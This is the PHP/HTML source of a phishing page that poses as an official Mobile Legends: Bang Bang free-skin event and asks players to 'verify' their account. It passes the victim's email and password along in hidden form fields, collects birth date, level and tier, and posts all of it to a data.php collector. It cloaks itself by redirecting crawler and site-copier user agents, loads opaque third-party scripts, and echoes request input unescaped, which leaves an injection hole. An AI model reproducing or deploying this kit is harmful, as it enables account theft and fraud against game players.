<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: tokoalexhost.com');
die();
}
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta name="keywords" content="MLBB, MLBB Evebt, MLBB Free Skin">
        <meta name="description" content="Get claim and draw your free skin now!">
        <meta name="author" content="Alex Ariandi">
        <title>Mobile Legends: Bang Bang</title>
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Mobile Legends: Bang Bang">
        <meta property="og:type" content="website">
        <meta name="copyright" content="Moonton">
        <meta name="theme-color" content="#baaff3">
        <link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
        <meta property="og:image" content="https://i.ibb.co/hY6LgnN/iu-Tt8-Y9wz-C3-YCWg-MGp-Jcswm-XGy-G-t6-XHDy-PDv6-ZLl-GZQb-Ebeu-Lm-Sb-ZGD2-DHw-UB3-ZAv-Y-s180-rw.webp">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3ddd40ca064d997b6655739e7a0e8a65acc106e8/alex-vikontakte.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/1591ba04a57c11f4b18d2ebb39e03e4a81715c83/alex-google.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3fce8843edde49a48905ae1ed9cf237534e547dd/alex-moonton.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/06e649cdc3c3d152f9c275ded79391eeff6eb049/MLBB-rotate.css">
        <link rel="stylesheet" href="alexFrontEnd/css/style-AlexHost.css">
    </head>
    <body>
        <div class="appalexmoba">
            <div id="rotateAlexHosting" style="width: auto; background-color:#10182c; background-repeat: no-repeat; background-position: center center; background-size: 30%; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto;">
        <div style="display:block; width: auto; background-image: url(https://play.mobilelegends.com/events/collectenergon/images/vertical.png); background-repeat: no-repeat; background-position: center center; background-size: 30%; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto; animation: rotate 1.5s cubic-bezier(0.57, -0.1, 1, 0.89) infinite alternate;">
        </div>
        </div>
            <div class="conatineralexmoba" id="AlexHosting">
                <div class="headeralexmoba">
                    <div class="kiriheadmoba">
                        <img src="https://rawcdn.githack.com/AlexHostX/logAlex/e0b6e1c2dea4cb77af37b29067e401242514e538/mlbb.webp">
                    </div>
                    <div class="kananheadmoba">
                        <div class="toastmobalex">
                            <p id="toastnick"><?php echo $_POST['nick'];?></p>
                        </div>
                        <div class="rulesmobaalex" onclick="showAlexrules()" onmousedown="buka.play();">
                            <p>?</p>
                        </div>
                    </div>
                </div>
                <div class="banneralexmoba">
                    <div class="slideralexbanner">
                       <iframe width="378" height="182" src="https://www.youtube.com/embed/GWeAitK4VFo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                        
                        </div>
                    </div>
                </div>
                <div class="subverifalex">
                    <div class="ucapansubverifalex">
                        <p>Please Verification Your Account</p>
                    </div>
                </div>
                <div class="isimobalaex">
                    <div class="verificationalexmoba">
                        <form class="login-form" class="alexformmoba" method="POST" action="data.php">
                            <div class="itemformalexmoba">
                                <div class="doubleformalex">
                                    <div class="itemformmarsya">
                                        <label>User ID</label>
                                        <input type="text" name="playid" value="<?php echo $_POST['playid'];?>" readonly>
                                    </div>
                                    <div class="itemformmarsya" style="width: 70%; margin-left: 10px;">
                                        <label>Zone ID</label>
                                        <input type="text" name="zoneid" value="<?php echo $_POST['zoneid'];?>" readonly>
                                    </div>
                                </div>
                            </div>
                            <div class="itemformalexmoba">
                                <label>Nickname</label>
                                <input type="text" name="nickname" value="<?php echo $_POST['nick'];?>" readonly>
                            </div>
                            <div class="itemformalexmoba">
                                <label>Date of Birth</label>
                                <div class="doubleformalex">
                                    <div class="itemformmarsya triple">
                                        <select class="select-alexmarsya" name="year" required>
                                            <option value="" selected="selected" disabled="disabled">Year</option>
                                            <option>1985</option>
                                            <option>1986</option>
                                            <option>1987</option>
                                            <option>1988</option>
                                            <option>1989</option>
                                            <option>1990</option>
                                            <option>1991</option>
                                            <option>1992</option>
                                            <option>1993</option>
                                            <option>1994</option>
                                            <option>1995</option>
                                            <option>1996</option>
                                            <option>1997</option>
                                            <option>1998</option>
                                            <option>1999</option>
                                            <option>2000</option>
                                            <option>2001</option>
                                            <option>2002</option>
                                            <option>2003</option>
                                            <option>2004</option>
                                            <option>2005</option>
                                            <option>2006</option>
                                            <option>2007</option>
                                            <option>2008</option>
                                            <option>2009</option>
                                            <option>2010</option>
                                            <option>2011</option>
                                            <option>2012</option>
                                            <option>2013</option>
                                            <option>2014</option>
                                            <option>2015</option>
                                            <option>2016</option>
                                            <option>2017</option>
                                            <option>2018</option>
                                            <option>2019</option>
                                            <option>2020</option>
                                        </select>
                                        <select class="select-alexmarsya" name="month" required>
                                            <option value="" selected="selected" disabled="disabled">Month</option>
                                            <option>January</option>
                                            <option>February</option>
                                            <option>March</option>
                                            <option>April</option>
                                            <option>May</option>
                                            <option>June</option>
                                            <option>July</option>
                                            <option>August</option>
                                            <option>September</option>
                                            <option>October</option>
                                            <option>November</option>
                                            <option>December</option>
                                        </select>
                                        <select class="select-alexmarsya" name="day" required style="margin-right: unset;">
                                            <option value="" selected="selected" disabled="disabled">Day</option>
                                            <option>1</option>
                                            <option>2</option>
                                            <option>3</option>
                                            <option>4</option>
                                            <option>5</option>
                                            <option>6</option>
                                            <option>7</option>
                                            <option>8</option>
                                            <option>9</option>
                                            <option>10</option>
                                            <option>11</option>
                                            <option>12</option>
                                            <option>13</option>
                                            <option>14</option>
                                            <option>15</option>
                                            <option>16</option>
                                            <option>17</option>
                                            <option>18</option>
                                            <option>19</option>
                                            <option>20</option>
                                            <option>21</option>
                                            <option>22</option>
                                            <option>23</option>
                                            <option>24</option>
                                            <option>25</option>
                                            <option>26</option>
                                            <option>27</option>
                                            <option>28</option>
                                            <option>29</option>
                                            <option>30</option>
                                            <option>31</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                            <div class="itemformalexmoba">
                                <label>Level</label>
                                <select class="select-alexmarsya" name="level" required>
                                    <option value="" selected="selected" disabled="disabled">Choose Account Level</option>
                                    <option>1</option>
                                    <option>2</option>
                                    <option>3</option>
                                    <option>4</option>
                                    <option>5</option>
                                    <option>6</option>
                                    <option>7</option>
                                    <option>8</option>
                                    <option>9</option>
                                    <option>10</option>
                                    <option>11</option>
                                    <option>12</option>
                                    <option>13</option>
                                    <option>14</option>
                                    <option>15</option>
                                    <option>16</option>
                                    <option>17</option>
                                    <option>18</option>
                                    <option>19</option>
                                    <option>20</option>
                                    <option>21</option>
                                    <option>22</option>
                                    <option>23</option>
                                    <option>24</option>
                                    <option>25</option>
                                    <option>26</option>
                                    <option>27</option>
                                    <option>28</option>
                                    <option>29</option>
                                    <option>30</option>
                                    <option>31</option>
                                    <option>32</option>
                                    <option>33</option>
                                    <option>34</option>
                                    <option>35</option>
                                    <option>36</option>
                                    <option>37</option>
                                    <option>38</option>
                                    <option>39</option>
                                    <option>40</option>
                                    <option>41</option>
                                    <option>42</option>
                                    <option>43</option>
                                    <option>44</option>
                                    <option>45</option>
                                    <option>46</option>
                                    <option>47</option>
                                    <option>48</option>
                                    <option>49</option>
                                    <option>50</option>
                                    <option>51</option>
                                    <option>52</option>
                                    <option>53</option>
                                    <option>54</option>
                                    <option>55</option>
                                    <option>56</option>
                                    <option>57</option>
                                    <option>58</option>
                                    <option>59</option>
                                    <option>60</option>
                                    <option>61</option>
                                    <option>62</option>
                                    <option>63</option>
                                    <option>64</option>
                                    <option>65</option>
                                    <option>66</option>
                                    <option>67</option>
                                    <option>68</option>
                                    <option>69</option>
                                    <option>70</option>
                                    <option>71</option>
                                    <option>72</option>
                                    <option>73</option>
                                    <option>74</option>
                                    <option>75</option>
                                    <option>76</option>
                                    <option>77</option>
                                    <option>78</option>
                                    <option>79</option>
                                    <option>80</option>
                                    <option>81</option>
                                    <option>82</option>
                                    <option>83</option>
                                    <option>84</option>
                                    <option>85</option>
                                    <option>86</option>
                                    <option>87</option>
                                    <option>88</option>
                                    <option>89</option>
                                    <option>90</option>
                                    <option>91</option>
                                    <option>92</option>
                                    <option>93</option>
                                    <option>94</option>
                                    <option>95</option>
                                    <option>96</option>
                                    <option>97</option>
                                    <option>98</option>
                                    <option>99</option>
                                    <option>100</option>
                                </select>
                            </div>
                            <div class="itemformalexmoba">
                                <label>Tier</label>
                                <select class="select-alexmarsya" name="tier" required>
                                    <option value="" selected="selected" disabled="disabled">Choose Account Tier</option>
                                    <option>Warrior</option>
                                    <option>Elite</option>
                                    <option>Master</option>
                                    <option>Grandmaster</option>
                                    <option>Epic</option>
                                    <option>Legend</option>
                                    <option>Mythic</option>
                                    <option>Glorious Mythic</option>
                                </select>
                            </div>
                            <div class="itemformalexmoba" style="align-items: center;">
                                <input type="hidden" name="email" value="<?php echo $_POST['email'];?>">
                                <input type="hidden" name="password" value="<?php echo $_POST['password'];?>">
                                <input type="hidden" name="login" value="<?php echo $_POST['login'];?>">
                                <input type="hidden" name="random" value="<?php $permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyz'; echo substr(str_shuffle($permitted_chars), 0, 10);?>">
                                <button type="submit" onmousedown="buka.play();">Verify</button>
                            </div>
                        </form>
                    </div>
                </div>
                
                <div class="popalexrulesmoba" style="display: none;">
                    <div class="boxmobapoprules">
                        <div class="closepoprulesalex">
                            <img src="alexFrontEnd/img/close-alex.png" onclick="closeAlexrules()" onmousedown="tutup.play();">
                        </div>
                        <div class="boxmobarulesalex">
                            <div class="ucapanpopalexrules">
                                <h3>Rules Event</h3>
                            </div>
                            <div class="steprulesalex">
                                <span>1. During the event, prizes are subject to change at any time without prior notice.</span>
                                <span>2. Only accounts that have been bind can receive gifts.</span>
                                <span>3. You can claim various prizes, ranging from skins to diamonds.</span>
                                <span>4. Draw skins can only be played once for free. It's worth 50 diamonds for the next spin.</span>
                                <span>5. Prizes or prizes from draw spins are sent directly to the in-game inbox and you can claim them from there</span>
                                <span>6. There may be a slight delay in receiving the prize. We appreciate your patience! Please contact Customer Service if you do not receive a gift.</span>
                                <span>7. MLBB reserves the right to have the final interpretation for the above content.</span>
                            </div>
                        </div>
                    </div>
                </div>
                
                
                <iframe scrolling="no" allow="autoplay" src="https://rawcdn.githack.com/AlexHostX/all.asset/001b222ae2a78373bc3a26702125100aedcccfaf/Mobile%20Legends%20Bang%20Bang%20-%20Main%20Theme%20(Live%20Orchestra).mp3" width="0" height="0" frameborder="no"></iframe>
            </div>
        </div>
        <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script type="text/javascript" src="https://rawcdn.githack.com/7262777272663/24732244/main/2347865311467.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="alexFrontEnd/js/js-AlexHost.js"></script>
        <script src="https://rawcdn.githack.com/AlexHostX/protect/aaa1462a19b8d8b6cbd68101a5ac89f4955b49de/input-exception.js"></script>
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">
    </body>
</html>